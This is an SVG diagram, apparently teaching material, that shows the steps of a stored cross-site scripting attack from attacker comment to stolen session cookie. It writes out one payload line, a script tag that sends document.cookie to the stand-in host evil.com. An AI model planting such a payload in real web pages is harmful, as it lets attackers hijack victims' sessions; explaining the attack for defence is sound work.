<ns0:svg xmlns:ns0="http://www.w3.org/2000/svg" viewBox="0 0 1280 720" font-family="Arial, sans-serif">
  <ns0:rect x="32.2247" y="12.5491" width="1095.6378" height="627.4509" rx="6.2745" fill="#e8f4f8" stroke="#4a90e2" stroke-width="2.5098" />
  <ns0:text x="580.0435" y="50.1961" text-anchor="middle" font-size="22.5883" font-weight="bold" fill="#333">Stored XSS Attack Flow</ns0:text>
  <ns0:text x="64.4493" y="87.8432" font-size="15.0588" fill="#555">1. Attacker posts malicious comment:</ns0:text>
  <ns0:text x="88.6178" y="110.4314" font-size="13.8039" fill="#dc3545">&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</ns0:text>
  <ns0:rect x="64.4493" y="131.7647" width="193.3478" height="56.4706" rx="6.2745" fill="#f8d7da" stroke="#dc3545" stroke-width="2.5098" />
  <ns0:text x="161.1232" y="166.9019" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="#333">Attacker</ns0:text>
  <ns0:rect x="370.5834" y="131.7647" width="209.4602" height="56.4706" rx="6.2745" fill="#fff3cd" stroke="#ffc107" stroke-width="2.5098" />
  <ns0:text x="475.3134" y="166.9019" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="#333">Web Server</ns0:text>
  <ns0:rect x="692.8297" y="131.7647" width="209.4602" height="56.4706" rx="6.2745" fill="#d4edda" stroke="#28a745" stroke-width="2.5098" />
  <ns0:text x="797.5599" y="166.9019" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="#333">Database</ns0:text>
  <ns0:line x1="257.7971" y1="159.3726" x2="370.5834" y2="159.3726" stroke="#dc3545" stroke-width="2.5098" marker-end="url(#ar6)" />
  <ns0:line x1="580.0435" y1="159.3726" x2="692.8297" y2="159.3726" stroke="#dc3545" stroke-width="2.5098" marker-end="url(#ar6)" />
  <ns0:text x="64.4493" y="232.1568" font-size="15.0588" fill="#555">2. Victim views the page with the comment</ns0:text>
  <ns0:line x1="797.5599" y1="188.2353" x2="797.5599" y2="263.5294" stroke="#4a90e2" stroke-width="1.8823" />
  <ns0:rect x="64.4493" y="263.5294" width="193.3478" height="69.0196" rx="6.2745" fill="#fff3cd" stroke="#ffc107" stroke-width="2.5098" />
  <ns0:text x="161.1232" y="292.3921" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="#333">Victim</ns0:text>
  <ns0:text x="161.1232" y="313.7254" text-anchor="middle" font-size="13.8039" fill="#555">Browser</ns0:text>
  <ns0:rect x="370.5834" y="263.5294" width="209.4602" height="69.0196" rx="6.2745" fill="#fff3cd" stroke="#ffc107" stroke-width="2.5098" />
  <ns0:text x="475.3134" y="292.3921" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="#333">Web Server</ns0:text>
  <ns0:text x="475.3134" y="313.7254" text-anchor="middle" font-size="13.8039" fill="#555">serves page</ns0:text>
  <ns0:rect x="692.8297" y="263.5294" width="209.4602" height="69.0196" rx="6.2745" fill="#d4edda" stroke="#28a745" stroke-width="2.5098" />
  <ns0:text x="797.5599" y="292.3921" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="#333">Database</ns0:text>
  <ns0:text x="797.5599" y="313.7254" text-anchor="middle" font-size="13.8039" fill="#555">returns data</ns0:text>
  <ns0:line x1="370.5834" y1="297.4117" x2="257.7971" y2="297.4117" stroke="#4a90e2" stroke-width="2.5098" marker-end="url(#ar6b)" />
  <ns0:line x1="692.8297" y1="297.4117" x2="580.0435" y2="297.4117" stroke="#4a90e2" stroke-width="2.5098" marker-end="url(#ar6b)" />
  <ns0:text x="64.4493" y="376.4705" font-size="15.0588" fill="#555">3. Browser executes the script</ns0:text>
  <ns0:line x1="161.1232" y1="332.549" x2="161.1232" y2="401.5686" stroke="#dc3545" stroke-width="1.8823" />
  <ns0:rect x="64.4493" y="401.5686" width="290.0218" height="69.0196" rx="6.2745" fill="#f8d7da" stroke="#dc3545" stroke-width="2.5098" />
  <ns0:text x="209.4602" y="430.4314" text-anchor="middle" font-size="15.0588" font-weight="bold" fill="#333">evil.com</ns0:text>
  <ns0:text x="209.4602" y="455.5294" text-anchor="middle" font-size="13.8039" fill="#555">receives session cookie</ns0:text>
  <ns0:text x="402.808" y="439.2157" font-size="15.0588" fill="#dc3545">4. Cookie sent to attacker</ns0:text>
